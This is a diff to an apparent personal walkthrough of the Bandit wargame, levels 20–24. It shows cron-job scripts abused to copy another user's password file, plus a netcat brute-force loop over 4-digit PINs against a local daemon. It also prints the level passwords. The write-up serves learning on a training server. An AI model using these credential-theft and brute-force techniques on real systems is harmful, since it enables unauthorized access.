@@ -509,8 +509,6 @@ $ screen -r pid.tty.name # jump to the screen which we run the server on
 $ echo "GbKksEFF4yrVs6il55v6gwY5aVje5f0j" | nc -l -p 22222
 gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
 ```
-password to next lv : ```gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr```
-
 
 another way to do it
 ```console
@@ -522,6 +520,8 @@ Password matches, sending next password
 gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
 [1]+  Done                    echo "GbKksEFF4yrVs6il55v6gwY5aVje5f0j" | nc -l -p 22222
 ```
+
+password to next lv : ```gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr```
 
 # LV 21
 ```
@@ -553,3 +553,222 @@ Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
 ```
 
 password to next lv : ```Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI```
+
+# LV 22
+```
+Level Goal
+
+A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
+
+NOTE: Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints.
+Commands you may need to solve this level
+
+cron, crontab, crontab(5) (use “man 5 crontab” to access this)
+```
+
+this lv is similar to lv 21 so, go check the crontab file the you will found that there is a cronjob_bandit23 which execute ```/usr/bin/cronjob_bandit23.sh``` to find out what it does:
+
+```console
+$ /usr/bin/cronjob_bandit23.sh # let see what it does
+Copying passwordfile /etc/bandit_pass/bandit22 to /tmp/8169b67bd894ddbb4412f91573b38db3
+$ cat /tmp/8169b67bd894ddbb4412f91573b38db3 #okey what is in this file?
+Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+```
+so it seam like what the progame does get the content of /etc/bandit_pass/bandit22 which contain password of bandit22 and output it as /tmp/8169b67bd894ddbb4412f91573b38db3.
+
+
+now let read the shell script and understand it in detail:
+```console
+$ cat /usr/bin/cronjob_bandit23.sh
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+```
+```cat /etc/bandit_pass/$myname > /tmp/$mytarget```take the content base on myname and output it into a file in /tmp directory. To find out what is the name of the file we need to understand this line ```mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)```. the varible mytarget is the file name which is a the md5 sum of string "echo I am user $myname" which cut something something. and the varivle myname is the name of the user name associated with the current effective user ID
+
+
+So if we change $myname to bandit23 we will get the name of the file which contains password to next lv:
+```console
+bandit22@bandit:~$ (echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
+8ca319486bfbbc3663ea0fbe81326349
+bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+```
+
+passpassword to the next lv : ```jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n```
+
+# lv 23
+```
+Level Goal
+
+A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
+
+NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
+
+NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
+Commands you may need to solve this level
+
+cron, crontab, crontab(5) (use “man 5 crontab” to access this)
+```
+okey.. this will be my first time writing a shell scrip too...
+same as last time, check out what it corntab and find the original script
+```console
+bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        timeout -s 9 60 ./$i
+        rm -f ./$i
+    fi
+done
+```
+each 60 sec, the script execute all script in /var/spool/$myname and remove it. 
+so now let make it execute when we want (not each 1 min) by just copy the code and change $myname to bandit24
+```console
+$ mkdir /tmp/kurohat23
+$ cd /tmp/kurohat23
+§ nano bandit23.sh # copy script below, not that I commented timeout out,
+#!/bin/bash
+
+cd /var/spool/bandit24
+echo "Executing and deleting all scripts in /var/spool/bandit24:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        # timeout -s 9 60 ./$i
+        rm -f ./$i
+    fi
+done
+$ chmod 777 bandit23.sh #make it execute able
+```
+now let make a script which will fetch the password and output it to us
+```console
+$ nano fetchkey.sh
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/kurohat23/key.txt #get password and put it in key.txt
+$ chmod 777 fetchkey.sh  #make it execute able
+$ touch key.txt # create key.txt for recieving password
+$ chmod 666 key.txt # give everyone read/write permission
+$ cp fetchkey.sh /var/spool/bandit24 # copy the script and put it in /var/spool/bandit24
+$ ./bandit23.sh #run bandit23.sh
+Executing and deleting all scripts in /var/spool/bandit24
+Handling *
+Handling .*
+$ cat key.txt 
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+```
+passpassword to the next lv : ```UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ```
+
+# lv 24
+```
+Level Goal
+A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+```
+So by read the goal we need to use netcat sending a current password + 4 digit pincode (0000-9999) let try out.
+```console
+bandit24@bandit:~$ echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0000" | nc localhost 30002
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Wrong! Please enter the correct pincode. Try again.
+```
+I got it right now we have to bructe force the pin code using shell script
+```console
+$ mkdir /tmp/kurohat24 # create directory
+$ touch test.sh # create file
+$ chmod 777 test.sh # make it execute able
+$ nano test.sh # add this
+#!/bin/bash
+for i in {0000..00003}
+do
+   echo "pin $i"
+done
+$ ./test.sh # run it
+pin 00000
+pin 00001
+pin 00002
+pin 00003
+```
+now we have brute force pin that is wroking for 0000 - 0003. let add fucntion, let make it send stuff with netcat (```echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ [pin]" | nc localhost 30002```)
+```bash
+#!/bin/bash
+for i in {0000..00003}
+do
+  echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" 
+done | nc localhost 30002
+```
+this is the result of running the script
+```console
+bandit24@bandit:/tmp/kurohat24$ ./test.sh 
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Timeout. Exiting.
+```
+it works, now it is time for the action. The plan I will create 2 shell script. 1 will start from 0000 to 5000, another one start from 5001 to 9999. The respone from the server will be put in a file call 5000.txt and 50001.txt
+```console
+$ touch brute1.sh
+$ touch brute2.sh
+$ chmod 777 brute1.sh
+$ chmod 777 brute2.sh
+$ nano brute1.sh # put the script below
+$ nano brute2.sh # put the script below
+```
+in brute1.sh
+```bash
+#!/bin/bash
+for i in {0000..5000}
+do
+    echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"
+done | nc localhost 30002 > 5000.txt # output the respons in a file
+
+echo "done 0000-5000"
+```
+brute2.sh
+```bash
+#!/bin/bash
+for i in {5001..9999}
+do
+    echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"
+done | nc localhost 30002 > 5001.txt
+
+echo "done 5001-9999"
+```
+now execute the scripts
+```console
+$ ./brute1.sh &
+[1] 27330
+$ ./brute2.sh 
+done 5001-9999
+$ done 0000-5000
+[1]+  Done                    ./brute1.sh
+$ cat 5000.txt | grep -v "Wrong" # 
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Timeout. Exiting.
+bandit24@bandit:/tmp/kurohat24$ cat 5001.txt | grep -v "Wrong"
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+Exiting.
+```
+
+password to next the lv is: ```uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG```
